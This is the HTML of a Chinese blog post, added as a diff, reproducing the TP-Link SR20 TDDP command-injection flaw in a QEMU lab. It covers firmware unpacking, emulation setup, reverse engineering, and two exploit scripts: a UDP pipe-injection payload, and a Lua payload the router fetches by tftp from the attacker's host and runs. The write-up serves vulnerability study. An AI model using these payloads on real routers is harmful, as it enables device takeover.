@@ -1,0 +1,803 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  
+  <title>
+    TP-Link SR20 RCE漏洞 |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="TP-Link SR20 RCE漏洞| 0 | 前言TDDP协议(TP-LINK Device Debug Protocol) 是TP-LINK申请了专利的一种在UPD通信的基础上设计的协议,而Google著名安全专家Matthew Garrett在TP-Link SR20设备上的TDDP协议文件中发现了一处可造成 “允许来自本地网络连接的任意命令执行”(RCE) 的漏洞. UPD通信协议的设计目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TP-Link SR20 RCE漏洞">
+<meta property="og:url" content="https://khighl.github.io.git/2025/07/08/TP-Link%20SR20%20RCE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="TP-Link SR20 RCE漏洞| 0 | 前言TDDP协议(TP-LINK Device Debug Protocol) 是TP-LINK申请了专利的一种在UPD通信的基础上设计的协议,而Google著名安全专家Matthew Garrett在TP-Link SR20设备上的TDDP协议文件中发现了一处可造成 “允许来自本地网络连接的任意命令执行”(RCE) 的漏洞. UPD通信协议的设计目">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://khighl.github.io.git/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751949335311.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751949484209.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751950365395.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751950866703.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751950946193.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751951017944.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751951071388.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751951598545.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751951723572.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751951833152.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751957195346.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751957298111.png">
+<meta property="article:published_time" content="2025-07-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-08T06:48:30.892Z">
+<meta property="article:author" content="zer00ne">
+<meta property="article:tag" content="iot漏洞复现">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://khighl.github.io.git/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751949335311.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="TP-Link SR20 RCE漏洞">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">TP-Link SR20 RCE漏洞</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TP-Link-SR20-RCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">TP-Link SR20 RCE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E8%A7%A3%E5%8C%85-qemu%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | 固件下载&amp;解包&amp;qemu配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.1.</span> <span class="toc-text">下载地址 :</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%8C%85"><span class="toc-number">1.2.2.</span> <span class="toc-text">解包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.3.</span> <span class="toc-text">qemu配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E9%80%86%E5%90%91"><span class="toc-number">1.3.</span> <span class="toc-text">| 2 | 二进制文件逆向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">| 3 | 利用手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%9B%B4%E6%8E%A5%E6%B3%A8%E5%85%A5execve"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.直接注入execve()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.文件上传</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-TP-Link SR20 RCE漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-07-07T16:00:00.000Z" itemprop="datePublished">2025-07-08</time>
+    <time style="display: none;" id="post-update-time">2025-07-08</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="TP-Link-SR20-RCE漏洞"><a href="#TP-Link-SR20-RCE漏洞" class="headerlink" title="TP-Link SR20 RCE漏洞"></a>TP-Link SR20 RCE漏洞</h1><h2 id="0-前言"><a href="#0-前言" class="headerlink" title="| 0 | 前言"></a>| 0 | 前言</h2><p><code>TDDP</code>协议(<code>TP-LINK Device Debug Protocol</code>) 是<code>TP-LINK</code>申请了专利的一种在<code>UPD</code>通信的基础上设计的协议,而<code>Google</code>著名安全专家<code>Matthew Garrett</code>在<code>TP-Link SR20</code>设备上的<code>TDDP</code>协议文件中发现了一处可造成 <strong>“允许来自本地网络连接的任意命令执行”(RCE)</strong> 的漏洞.</p>
+<p><code>UPD</code>通信协议的设计目的：<code>轻便</code>、<code>快速</code>、<code>不建立连接</code>(不像TCP那样要三次握手)</p>
+<h2 id="1-固件下载-解包-qemu配置"><a href="#1-固件下载-解包-qemu配置" class="headerlink" title="| 1 | 固件下载&amp;解包&amp;qemu配置"></a>| 1 | 固件下载&amp;解包&amp;qemu配置</h2><h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址 :"></a>下载地址 :</h3><p><a target="_blank" rel="noopener" href="https://static.tp-link.com/2018/201806/20180611/SR20(US)_V1_180518.zip" title="SR20(US)_V1_180518">SR20(US)_V1_180518</a></p>
+<h3 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e --preserve-symlinks tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin</span><br></pre></td></tr></table></figure>
+
+<h3 id="qemu配置"><a href="#qemu配置" class="headerlink" title="qemu配置"></a>qemu配置</h3><p>由于本次的固件采用了后台服务监听,所以必须采用qemu的system仿真</p>
+<p>我们首先需要从 <a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/" title="Debian 官网">Debian 官网</a> 下载内核，磁盘文件及镜像文件：</p>
+<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress" title="vmlinuz-3.2.0-4-vexpress">vmlinuz-3.2.0-4-vexpress</a></p>
+<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress" title="initrd.img-3.2.0-4-vexpress">initrd.img-3.2.0-4-vexpress</a></p>
+<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2" title="debian_wheezy_armhf_standard.qcow2">debian_wheezy_armhf_standard.qcow2</a></p>
+<p>然后将这三个文件放在一个文件夹下,并使创建一个启动脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">TAP接口配置</span></span><br><span class="line">TAP_IF=&quot;tap0&quot;</span><br><span class="line">BR_IF=&quot;br0&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确保 tap0 存在，并添加进 br0</span></span><br><span class="line">sudo ip tuntap add dev $TAP_IF mode tap</span><br><span class="line">sudo ip link set $TAP_IF up</span><br><span class="line">sudo brctl addif $BR_IF $TAP_IF</span><br><span class="line"></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line">    -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">    -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">    -net nic \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
+
+<p>运行启动脚本后在qemu内查看是否能ping通<code>8.8.8.8</code>以及<code>宿主机IP</code>,如果能ping通说明配置完毕</p>
+<p>最后我们使用scp命令将固件解包后的文件系统传送到qemu中,这个过程可能会有点漫长</p>
+<h2 id="2-二进制文件逆向"><a href="#2-二进制文件逆向" class="headerlink" title="| 2 | 二进制文件逆向"></a>| 2 | 二进制文件逆向</h2><p>根据漏洞报告我们可以锁定&#x2F;usr&#x2F;bin&#x2F;tddp这个二进制文件,将其拖入IDA中分析</p>
+<p><img src="/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751949335311.png" alt="1751949335311"></p>
+<p><code>main</code>函数中包含了内存分配,释放函数以及操作函数(我将其命名为<code>vuln</code>)</p>
+<p><img src="/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751949484209.png" alt="1751949484209"></p>
+<p>进入其中可以发现,先是分配了一块较大的内存,后创建了一个套接字</p>
+<p>我在讲机器出网<code>orw</code>的那篇文章中简单介绍过这几个函数,这详细说一说</p>
+<p><code>socket(AF_INET, SOCK_DGRAM, 0);</code>用于创建一个套接字空壳</p>
+<ul>
+<li><code>AF_INET</code>表示使用的协议,其中<code>2</code>代表使用 <code>IPv4 协议</code></li>
+<li><code>SOCK_DGRAM</code>表示数据报模式,其中<code>2</code>代表<code>UDP 数据报模式</code></li>
+<li>最后一个<code>0</code>代表自动匹配协议号</li>
+</ul>
+<p><code>int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</code>把一个 <code>socket</code> 和一个本地的 <code>IP 地址 + 端口 </code>绑定在一起,让操作系统知道这个<code> socket</code> 的作用是“负责监听这个端口”</p>
+<ul>
+<li><code>int sockfd</code>表示指定的套接字句柄</li>
+<li><code>const struct sockaddr *addr</code>是个结构体</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">    <span class="type">sa_family_t</span> sa_family;   <span class="comment">// 地址族（AF_INET / AF_INET6 / AF_UNIX ...）</span></span><br><span class="line">    <span class="type">char</span>        sa_data[<span class="number">14</span>]; <span class="comment">// 装 IP 和端口的原始数据（但不可直接操作）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>socklen_t addrlen</code>表示二参结构体的大小</li>
+</ul>
+<p>通过以上<code>socket</code>与<code>bind</code>操作,实现了创建一个<code>socket</code>绑定到到<code>1040</code>端口,并对本地端口<code>1040</code>的监听</p>
+<p>当以上函数正常执行后,执行流会来到<code>sub_16418</code></p>
+<p><img src="/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751950365395.png" alt="1751950365395"></p>
+<p>其中调用的<code>recvfrom</code>函数</p>
+<p><code>recvfrom()</code> 是一个 <strong>用于接收 UDP 数据包</strong> 的系统调用,它不仅接收数据,还能保存数据的来源</p>
+<p><code>recvfrom(int sockfd,void *buf,size_t len,int flags,struct sockaddr *src_addr,socklen_t *addrlen);</code></p>
+<ul>
+<li><code>int sockfd</code>仍然是套接字句柄</li>
+<li><code>void* buf</code>为接受数据的缓冲区大小,这里便是<code>调用calloc</code>分配的大内存块的起始地址偏移<code>45083</code>处开始存储接收到的数据</li>
+<li><code>size_t len</code>为最大接受数据的长度</li>
+<li><code>int flags</code>一般为<code>0</code></li>
+<li><code>struct sockaddr *src_addr</code>用于存储对端地址,也就是数据的来源</li>
+<li><code>socklen_t *addrlen</code>指向的内存中存储了上个参数的结构体大小</li>
+</ul>
+<p><img src="/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751950866703.png" alt="1751950866703"></p>
+<p>随后对接收到的数据进行第一字节检查是否为<code>1</code>,然后将对齐地址存放在<code>a1</code>偏移为<code>0x20</code>的地址,选择是否进入<code>sub_15E74</code>中</p>
+<p>这里涉及到了TDDP包的格式,可以看到报头的首项为版本号,这里指定为<code>1</code></p>
+<p><img src="/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751950946193.png" alt="1751950946193"></p>
+<p>进入后根据漏洞报告继续寻找<code>31</code>处的逻辑</p>
+<p><img src="/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751951017944.png" alt="1751951017944"></p>
+<p>可以看到这里的<code>cmd,v12</code>为超大内存块的起始地址位于<code>0xb01b</code>偏移的位置,也就是接收到的数据的起始地址</p>
+<p><img src="/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751951071388.png" alt="1751951071388"></p>
+<p>检查版本号为<code>1</code>后,将<code>cmd</code>与<code>v13</code>向高地址移动<code>12字节</code>,也就来到了<code>TDDP</code>报头的<code>Digest</code>字段的起始地址</p>
+<p><img src="/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751951598545.png" alt="1751951598545"></p>
+<p>然后是使用sscanf继续正则表达式过滤,将<code>cmd</code>中位于<code>;</code>前的字符串放入<code>sss</code>中,然后将<code>sss</code>与<code>v15</code>格式化入字符串,调用<code>System</code>函数,进入其中我们可以看到这里使用了execve(“&#x2F;bin&#x2F;sh”,”sh,-c”,0).说明我们可以在此<code>注入参数</code></p>
+<p><img src="/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751951723572.png" alt="1751951723572"></p>
+<p>我们退出<code>System</code>继续往下看,可以看到对<code>sss</code>名文件的下载与运行,且都没有对<code>sss</code>进行任何检查</p>
+<p><img src="/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751951833152.png" alt="1751951833152"></p>
+<h2 id="3-利用手法"><a href="#3-利用手法" class="headerlink" title="| 3 | 利用手法"></a>| 3 | 利用手法</h2><p>我们从以上逆向可以推断出两种利用手法</p>
+<p>但在注入之前,我们还需要将进行<code>chroot</code>操作,保证命令执行使用的根目录位于文件系统内</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd squashfs-root</span><br><span class="line">cp /bin/nc.traditional ./bin</span><br><span class="line">mv ./bin/nc.traditional ./bin/nc</span><br><span class="line">cp /lib/arm-linux-gnueabihf/libc.so.6 ./lib/arm-linux-gnueabihf</span><br><span class="line">cp /lib/ld-linux-armhf.so.3 ./lib</span><br><span class="line">mount -o bind /dev ./dev</span><br><span class="line">mount -t proc /proc ./proc</span><br><span class="line">chroot . sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-直接注入execve"><a href="#1-直接注入execve" class="headerlink" title="1.直接注入execve()"></a>1.直接注入execve()</h3><p>因为<code>sscanf</code>只过滤了<code>;</code>,我们还有别的手段对命令进行分割,比如<code>|</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line">from socket import socket</span><br><span class="line">tddp_port = 1040</span><br><span class="line">cmd=input(&quot;please input command&quot;)</span><br><span class="line">ip = &quot;192.168.52.133&quot;# (QEMU虚拟机的IP)</span><br><span class="line">s_send = socket(AF_INET, SOCK_DGRAM, 0)</span><br><span class="line">payload = (p8(1)+p8(0x31)).ljust(12, b&#x27;\x00&#x27;)</span><br><span class="line">payload += f&quot;| &#123;cmd&#125;;zer00ne&quot;.encode()</span><br><span class="line">s_send.sendto(payload, (ip, tddp_port))</span><br><span class="line">s_send.close()</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-文件上传"><a href="#2-文件上传" class="headerlink" title="2.文件上传"></a>2.文件上传</h3><p><code>System</code>的预期作用为从我们的宿主机下载对应文件名的文件:<code>tftp -gr [file_name] [IP]</code></p>
+<p>从<code>IP</code>端口的<code>atftpd</code>的根目录中下载名为<code>file_name</code>的文件,进行完<code>System</code>调用后会打开我们输入的文件名并运行</p>
+<p><img src="/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751957195346.png" alt="1751957195346"></p>
+<p>下载的路径我们可以使用<code>sudo ps -ef | grep tftp</code>查看</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zer00ne@zer00ne:~/Desktop/cve_review/new$ sudo ps -ef | grep tftp</span><br><span class="line">atftpd      5928       1  0 14:41 ?        00:00:00 /usr/sbin/in.tftpd --tftpd-timeout 300 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /tftpboot</span><br><span class="line">zer00ne     5948    3506  0 14:41 pts/2    00:00:00 grep --color=auto tftp</span><br></pre></td></tr></table></figure>
+
+<p>从这我们可以看到<code>atftpd</code>的根目录在<code>/tftpboot</code>中,也就是我们要把需要上传的文件存放在这个目录中</p>
+<p>首先使用<code>lua</code>写一个<code>rce</code>脚本,<code>cmd</code>为任意命令</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">config_test</span><span class="params">(config)</span></span></span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">execute</span>(&#123;cmd&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>然后exp脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> socket</span><br><span class="line">tddp_port = <span class="number">1040</span></span><br><span class="line">ip = <span class="string">&quot;192.168.52.133&quot;</span><span class="comment"># (QEMU虚拟机的IP)</span></span><br><span class="line"><span class="comment">#command = sys.argv[1]</span></span><br><span class="line"></span><br><span class="line">s_send = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)</span><br><span class="line">payload = (p8(<span class="number">1</span>)+p8(<span class="number">0x31</span>)).ljust(<span class="number">12</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">f&quot;/payload;zer00ne&quot;</span>.encode()</span><br><span class="line">s_send.sendto(payload, (ip, tddp_port))</span><br><span 